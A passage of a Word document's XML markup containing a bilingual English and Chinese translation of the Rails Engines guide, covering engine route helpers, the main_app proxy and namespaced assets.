      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>config/routes.rb</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 中的 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>Engine</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 类中，像这样：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="3480"/>
      </w:tblGrid>
      <w:tr w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w14:paraId="4CFED723" w14:textId="77777777" w:rsidTr="004E5E0B">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="4138E8F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Blorgh::Engine.routes.draw do</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3F4EC83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resources :posts</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4C64AAF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67902FA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由于有像这样的隔离路由，如果你希望从应用程序中连接一个 engine 的一个区域，你将需要使用 engine 的路由前缀的方法。类似调用 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>posts_path</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 这样常规的方法可能会去到一个位置的目的地如果应用程序和 engine 中都有这样的 helper 被定义。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="218126F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For instance, the following example would go to the application’s </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>posts_path</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> if that template was rendered from the application, or the engine’s </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>posts_path</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> if it was rendered from the engine: 例如，随后的例子将会来到应用程序的 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>posts_path</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 如果 ‘template’ 被应用程序渲染，或者 engine 的 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>posts_path</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 如果它被 engine 渲染：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4680"/>
      </w:tblGrid>
      <w:tr w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w14:paraId="7ECEE2D4" w14:textId="77777777" w:rsidTr="004E5E0B">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="72C15B0C" w14:textId="77777777" w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w:rsidRDefault="004E5E0B" w:rsidP="004E5E0B">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="left"/>
              <w:divId w:val="809594697"/>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link_to "Blog posts", posts_path %&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="61E0C87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要使的这个路由一直使用 engine 的 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>posts_path</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 路由 ‘helper’ 方法，我们必须在这个 ’helper’前调用与 engine 名称相同的前缀方法。</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5520"/>
      </w:tblGrid>
      <w:tr w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w14:paraId="635D48F3" w14:textId="77777777" w:rsidTr="004E5E0B">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="07766069" w14:textId="77777777" w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w:rsidRDefault="004E5E0B" w:rsidP="004E5E0B">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="left"/>
              <w:divId w:val="1472402186"/>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link_to "Blog posts", blorgh.posts_path %&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="0CC483F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如果你希望在 engine 中引用应用程序，简单的方式，使用 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>main_app</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> ‘helper’:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4920"/>
      </w:tblGrid>
      <w:tr w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w14:paraId="1BB91FA9" w14:textId="77777777" w:rsidTr="004E5E0B">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="6A06A371" w14:textId="77777777" w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w:rsidRDefault="004E5E0B" w:rsidP="004E5E0B">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="left"/>
              <w:divId w:val="1451164351"/>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link_to "Home", main_app.root_path %&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="280068A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如果你在 engine 中使用它，它将会*总是*来到应用程序的根目录。如果你离开 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>main_app</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> “routing proxy” 方法调用，它将会潜在的来到 engine 或者应用程序的根目录，取决于在哪调（应该是template位置的不同）用它。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="32BC2C8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If a template is rendered from within an engine and it’s attempting to use one of the application’s routing helper methods, it may result in an undefined method call. If you encounter such an issue, ensure that you’re not attempting to call the application’s routing methods without the </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>main_app</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> prefix from within the engine. 如果 ‘template’ 在一个 engine 中渲染并且它的企图是使用一个应用程序的路由 ‘helper’ 方法，它可能以一个未定义的方法调用作为结果。如果你遭遇这样的问题，请确保在 engine 中没有 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>main_app</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 的方法你不打算调用应用程序的路由方法。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="78053106"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6.3 Assets</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A36A84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Engine 中的 ‘assets’ 工作方式和一个完全的应用程序相同。因为 engine 类继承至 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>Rails::Engine</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">，应用程序将会知道查找 engine 中的 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>app/assets</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 目录（来获取）潜在的资源。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1DE31B7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Much like all the other components of an engine, the assets should also be namespaced. This means if you have an asset called </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>style.css</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">, it should be placed at </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>app/assets/stylesheets/[engine name]/style.css</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">, rather than </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>app/assets/stylesheets/style.css</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">. If this asset wasn’t namespaced, then there is a possibility that the host application could have an asset named identically, in which case the application’s asset would take precedence and the engine’s one would be all but ignored. 与 engine 的其他组件非常相似，’assets’ 也是被名称空间化的。这里的意思是如果你有一个 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>style.css</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 的 ‘asset’ 调用，它将会被放在在 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>app/assets/stylesheets/[engine name]/style.css</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 而不是 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>app/assets/stylesheets/style.css</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>。如果这个 ‘asset’ 没有名称空间化，那么这里有可能宿主应用程序有一个相同名称的 ’asset’，在这种情况下，应用程序的 ’asset’将优先考虑那么engine的会被忽略。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2CA266F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Imagine that you did have an asset located at </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>app/assets/stylesheets/blorgh/style.css</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> To include this asset inside an application, just use </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>stylesheet_link_tag</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> and reference the asset as if it were inside the engine: 试想你确实有一个 ‘asset’ 位于 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>app/assets/stylesheets/blorgh/style.css</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 要包含这个 ‘asset’ 到一个应用程序中，仅仅使用 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>stylesheet_link_tag</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 并且引用这个 ‘asset’ 如果它在 engine中：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5400"/>
      </w:tblGrid>
      <w:tr w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w14:paraId="52FF6730" w14:textId="77777777" w:rsidTr="004E5E0B">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="6D543843" w14:textId="77777777" w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w:rsidRDefault="004E5E0B" w:rsidP="004E5E0B">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="left"/>
              <w:divId w:val="580260405"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>&lt;%=</w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>stylesheet_link_tag "blorgh/style.css"</w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>%&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="2B26783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你也可以指定这些 ‘asset’ 作为其他 ‘asset’ 的依赖在处理文件中使用 ‘Asset Pipeline’ 调用声明：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="3000"/>
      </w:tblGrid>
      <w:tr w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w14:paraId="150A2F35" w14:textId="77777777" w:rsidTr="004E5E0B">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="7DDF101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w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="717996C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 require blorgh/style</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="609A285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w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="42C1AE10"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6.4 Separate Assets &amp; Precompiling</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B3F834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这里是些解决方案，你的 engine 的 ‘asset’ 不被宿主应用程序需要的。例如，这样说你仅仅在你的 engine 创建了一个管理员功能。这个情况下，宿主应用程序不需要 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>admin.css</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 或者 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>admin.js</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
